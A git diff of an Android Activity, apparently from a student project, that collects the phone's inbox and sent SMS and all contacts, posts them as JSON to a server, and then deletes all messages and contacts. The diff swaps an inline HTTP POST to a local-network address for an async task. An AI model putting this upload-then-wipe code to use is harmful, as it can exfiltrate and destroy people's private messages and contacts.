@@ -1,29 +1,11 @@
 package iiu.fyp.cdsr;
 
-import java.io.IOException;
-import java.io.UnsupportedEncodingException;
-import java.util.ArrayList;
-import java.util.List;
-
-import org.apache.http.HttpResponse;
-import org.apache.http.NameValuePair;
-import org.apache.http.client.ClientProtocolException;
-import org.apache.http.client.HttpClient;
-import org.apache.http.client.ResponseHandler;
-import org.apache.http.client.entity.UrlEncodedFormEntity;
-import org.apache.http.client.methods.HttpPost;
-import org.apache.http.entity.StringEntity;
-import org.apache.http.impl.client.BasicResponseHandler;
-import org.apache.http.impl.client.DefaultHttpClient;
-import org.apache.http.message.BasicNameValuePair;
-import org.apache.http.protocol.HTTP;
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
 
 import android.net.Uri;
-import android.net.http.AndroidHttpClient;
 import android.os.Bundle;
 import android.provider.BaseColumns;
 import android.provider.ContactsContract;
@@ -56,57 +38,28 @@ public class UploadContent extends Activity {
 		Uri uri = Uri.parse("content://sms/sent");
 		JSONObject sentObject = getsms(uri, "sent");
 		
-		JSONObject smsObj = new JSONObject();
+		JSONObject smsObject = new JSONObject();
 		JSONArray smsArray = new JSONArray();
 		
 		smsArray.put(inboxObject);
 		smsArray.put(sentObject);
 		try {
-			smsObj.put("SMS", smsArray);
+			smsObject.put("SMS", smsArray);
 		} catch (JSONException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
-		
-		POSTconnection(inboxObject);
+		new PostData(smsObject).execute();
         deletAllMsgs();
-        JSONObject contacts_obj = getcontacts();
-        POSTconnection(contacts_obj);
+        
+        JSONObject contactsObj = getcontacts();
+        new PostData(contactsObj).execute();
         deleteAllContacts();
+        
+        
         
 	}
 	
-	public void POSTconnection(JSONObject Object)
-	{
-		String url = "http://192.168.10.105:6543/data";
-		final AndroidHttpClient client = AndroidHttpClient.newInstance("Android");
-		final HttpPost postRequest = new HttpPost(url);
-		
-		StringEntity entity;
-		try {
-			entity = new StringEntity(Object.toString(), HTTP.UTF_8);
-			entity.setContentType("application/json");
-			postRequest.setEntity(entity);
-			
-		} catch (UnsupportedEncodingException e1) {
-			// TODO Auto-generated catch block
-			e1.printStackTrace();
-		}
-		
-		
-		
-		try {
-	        HttpResponse response = client.execute(postRequest);
-	        if(response != null)
-            {
-            	
-            }
-		}
-		catch (Exception e)
-		{
-			
-		}
-	}
 	
 
 	@Override
